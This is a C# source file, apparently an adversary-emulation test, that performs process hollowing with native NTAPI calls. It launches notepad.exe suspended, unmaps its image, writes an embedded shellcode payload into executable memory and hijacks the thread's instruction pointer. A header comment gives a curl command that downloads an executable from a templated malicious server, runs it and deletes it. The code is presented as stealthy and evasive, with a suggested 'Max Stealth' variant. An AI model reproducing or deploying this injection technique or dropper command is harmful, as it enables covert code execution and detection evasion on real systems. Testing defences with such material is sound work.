// The 100% Native Ghost: Full NTAPI Hollowing (C#)
 
// cmd.exe /c "curl -s #{server.malicious.url}/FullNativeHollow.exe -o %TEMP%\Ghost.exe && %TEMP%\Ghost.exe && del %TEMP%\Ghost.exe"

using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace FullNativeHollow
{
    class Program
    {
        // --- 🟢 FULL EMBEDDED PAYLOAD (x64 Calc PoC) 🟢 ---
        private static byte[] payload = new byte[] {
            0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0,
            0x48, 0x8d, 0x15, 0x07, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x05, 0x00, 0x00, 0x00, 0xff, 0x25,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x8d, 0x05, 0x01, 0x00, 0x00, 0x00, 0xc3, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
        };

        // --- NTAPI Delegates ---
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtAllocateVirtualMemory(IntPtr hProc, ref IntPtr baseAddr, IntPtr zeroBits, ref UIntPtr regionSize, uint allocType, uint protect);
        
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtWriteVirtualMemory(IntPtr hProc, IntPtr baseAddr, byte[] buffer, uint size, out IntPtr written);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtGetContextThread(IntPtr hThread, ref CONTEXT64 context);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtSetContextThread(IntPtr hThread, ref CONTEXT64 context);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtResumeThread(IntPtr hThread, out uint suspendCount);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        // --- Structures ---
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64 {
            public ulong P1, P2, P3, P4, P5, P6; public uint ContextFlags; public uint MxCsr; public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs; public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7, Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15, Rip;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)] public byte[] Flt;
            public ulong L1, L2, L3, L4, V0, V1, V2, V3, V4, V5, V6, V7, V8, V9, V10, V11, V12, V13, V14, V15, V16, V17, V18, V19, V20, V21, V22, V23, V24, V25, V26, V27, V28, V29, V30, V31, VC, DC, B1, B2, E1, E2;
        }

        // --- Helper Imports ---
        [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        
        // We use the Win32 CreateProcess solely to get a stable PID/Thread Handle quickly in this PoC. 
        // In a "Max Stealth" build, you'd replace this with NtCreateUserProcess.
        [DllImport("kernel32.dll")] public static extern bool CreateProcess(string app, string cmd, IntPtr pA, IntPtr tA, bool inh, uint flags, IntPtr env, string dir, [In] ref STARTUPINFO si, out PROCESS_INFORMATION pi);
        [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public uint cb; public string res, desk, title; public uint x, y, xs, ys, xc, yc, fill, flags; public ushort show, res2; public IntPtr res2p, hIn, hOut, hErr; }
        [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public uint dwProcessId, dwThreadId; }

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Starting 100% Native NTAPI Hollowing...");

            // 1. Resolve all NTAPI functions dynamically
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            var ntAlloc = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(GetProcAddress(ntdll, "NtAllocateVirtualMemory"), typeof(NtAllocateVirtualMemory));
            var ntWrite = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(GetProcAddress(ntdll, "NtWriteVirtualMemory"), typeof(NtWriteVirtualMemory));
            var ntUnmap = (NtUnmapViewOfSection)Marshal.GetDelegateForFunctionPointer(GetProcAddress(ntdll, "NtUnmapViewOfSection"), typeof(NtUnmapViewOfSection));
            var ntGetCtx = (NtGetContextThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(ntdll, "NtGetContextThread"), typeof(NtGetContextThread));
            var ntSetCtx = (NtSetContextThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(ntdll, "NtSetContextThread"), typeof(NtSetContextThread));
            var ntResume = (NtResumeThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(ntdll, "NtResumeThread"), typeof(NtResumeThread));

            // 2. Start suspended process
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            CreateProcess("C:\\Windows\\System32\\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            // 3. Hollow out the process
            IntPtr baseAddr = (IntPtr)0x400000;
            ntUnmap(pi.hProcess, baseAddr);

            // 4. Allocate and Write
            UIntPtr size = (UIntPtr)payload.Length;
            ntAlloc(pi.hProcess, ref baseAddr, IntPtr.Zero, ref size, 0x3000, 0x40);
            ntWrite(pi.hProcess, baseAddr, payload, (uint)payload.Length, out _);

            // 5. Native Context Manipulation
            CONTEXT64 ctx = new CONTEXT64();
            ctx.ContextFlags = 0x100001; // CONTEXT_CONTROL
            ntGetCtx(pi.hThread, ref ctx);
            ctx.Rip = (ulong)baseAddr;
            ntSetCtx(pi.hThread, ref ctx);

            // 6. Native Resume
            uint count;
            ntResume(pi.hThread, out count);

            Console.WriteLine("[+] 100% Native Routine Complete. No Win32 memory/thread APIs used.");
        }
    }
}
